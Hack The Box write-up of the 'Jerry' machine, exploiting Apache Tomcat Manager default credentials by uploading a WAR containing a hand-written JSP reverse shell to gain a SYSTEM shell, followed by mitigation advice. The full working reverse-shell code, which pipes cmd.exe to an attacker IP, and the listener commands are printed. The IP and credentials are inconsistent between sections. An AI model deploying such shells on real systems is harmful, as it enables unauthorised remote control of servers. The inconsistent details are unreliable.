# HTB – Jerry

| | |
|---|---|
| **OS** | Windows (Server 2012 R2) |
| **Difficulty** | Easy |
| **IP** | 10.10.10.95 |
| **Date** | 2026-11-12 |
| **Time spent** | ~60 min |

## Concepts

- Apache Tomcat default credentials
- WAR file deployment abuse
- Manual JSP reverse shell (no Metasploit)
- Tomcat runs as SYSTEM on Windows

## Tools

- nmap
- netcat (nc)
- jar (Java Archive tool)
- Browser (or curl)

---

## 1. Recon

```bash
sudo nmap -T4 -A -Pn 10.129.136.9
```

**Interesting ports / findings:**

| Port | Service | Version |
|---|---|---|
| 8080/tcp | HTTP | Apache Tomcat/Coyote JSP engine 1.1 (Tomcat 7.0.88) |

Only one port is open: 8080, running Apache Tomcat. The default Tomcat page is served, and the Manager App (`/manager/html`) is reachable.

---

## 2. Enumeration

Visiting `http://10.129.136.9:8080` shows the standard Tomcat landing page. The Manager App link is present and prompts for HTTP Basic Auth.

I tried common default credentials. The pair **tomcat:s3cret** granted access to the Tomcat Web Application Manager.

Once authenticated, the Manager exposes:

- A list of deployed applications
- A "Deploy" section with an option to upload a WAR file (`.war`)
- Start/Stop/Reload controls for each app

This is the attack surface: if we can upload a malicious WAR containing a JSP reverse shell, Tomcat will execute it with its own privileges.

---

## 3. Foothold

### 3.1 Crafting the JSP reverse shell manually

Instead of using msfvenom, I wrote a JSP page that:

1. Starts `cmd.exe`
2. Opens a TCP socket back to my machine
3. Spawns three threads to pipe stdin/stdout/stderr between the process and the socket

```jsp
<%@ page import="java.lang.*" %>
<%@ page import="java.util.*" %>
<%@ page import="java.io.*" %>
<%@ page import="java.net.*" %>
<%!
    static class StreamRedirector extends Thread {
        InputStream in;
        OutputStream out;

        StreamRedirector(InputStream in, OutputStream out) {
            this.in = in;
            this.out = out;
        }

        public void run() {
            try {
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = in.read(buffer)) != -1) {
                    out.write(buffer, 0, bytesRead);
                    out.flush();
                }
            } catch (Exception e) {
                // ignore
            }
        }
    }
%>
<%
    String host = "10.10.14.93";  // attacker IP (tun0)
    int port = 4444;

    try {
        Process p = Runtime.getRuntime().exec("cmd.exe");
        Socket s = new Socket(host, port);

        new StreamRedirector(p.getInputStream(), s.getOutputStream()).start();
        new StreamRedirector(p.getErrorStream(), s.getOutputStream()).start();
        new StreamRedirector(s.getInputStream(), p.getOutputStream()).start();
    } catch (Exception e) {
        // ignore
    }
%>
```

Save this as `shell.jsp`.

### 3.2 Packaging as a WAR

A `.war` file is just a ZIP with a specific layout. The simplest valid WAR is a single JSP at the root:

```bash
jar -cvf shell.war shell.jsp
```

### 3.3 Deploying and triggering

1. Start a listener:

   ```bash
   nc -lvnp 4444
   ```

2. In the Tomcat Manager, scroll to **"WAR file to deploy"**, upload `shell.war`, and click **Deploy**.
3. The application appears in the list (context path `/shell`).
4. Trigger the JSP by visiting:

   ```
   http://10.10.10.95:8080/shell/shell.jsp
   ```

The listener receives a connection.

### 3.4 Verifying the shell

```cmd
whoami
nt authority\system
```

Tomcat is running as **SYSTEM**, so the shell is already the highest privilege on the box. No privilege escalation is needed.

> **Note on shell stability:** This raw JSP shell can be finicky with line endings (`\r\n` vs `\n`) under `nc`. Using `rlwrap nc -lvnp 4444` or `ncat` improves interactivity. For Jerry, simple one-shot commands (`whoami`, `type`, `dir`) work fine.

---

## 4. Privilege escalation

Not required. The Tomcat service runs as `nt authority\system`, so the initial shell is already SYSTEM.

---

## 5. Flags

Both flags are located in the Administrator's desktop:

```cmd
cd C:\Users\Administrator\Desktop\flags
dir
type "2 for the price of one.txt"
```

- **user.txt**
- **root.txt**
---

## Mitigation

How the vulnerability could be fixed:

- Change default credentials on the Tomcat Manager (`admin:admin` is a well-known default).
- Restrict access to `/manager/html` to trusted IPs (e.g., via `manager.xml` `RemoteAddrValve`) or disable the Manager entirely in production.
- Run Tomcat as a low-privileged user (not SYSTEM/root), so a compromised webapp does not yield full host control.
- Disable WAR deployment from the Manager if not needed, or require stronger authentication (e.g., client certificates, MFA).
- Keep Tomcat patched and remove default applications from production instances.

---

## What I learned / where I got stuck

- **Default credentials are still a real-world issue.** `admin:admin` gave immediate access to a management interface that should never be exposed with weak auth.
- **A WAR is just a ZIP.** Writing the JSP by hand made me understand what msfvenom actually generates, and how Tomcat handles JSP compilation and deployment.
- **Context matters.** Checking `whoami` right after the shell revealed SYSTEM, which saved time — no privesc enumeration needed.
- **Gotcha:** The raw JSP shell had line-ending issues with plain `nc`; using `rlwrap` or sending commands one at a time helped.
- **Next time:** I'd try the same manual approach on a Linux Tomcat box to see how the JSP shell behaves with `/bin/bash` instead of `cmd.exe`.

---

## References

- Hack The Box – Jerry
- Tomcat Manager documentation
- PayloadsAllTheThings – JSP reverse shells
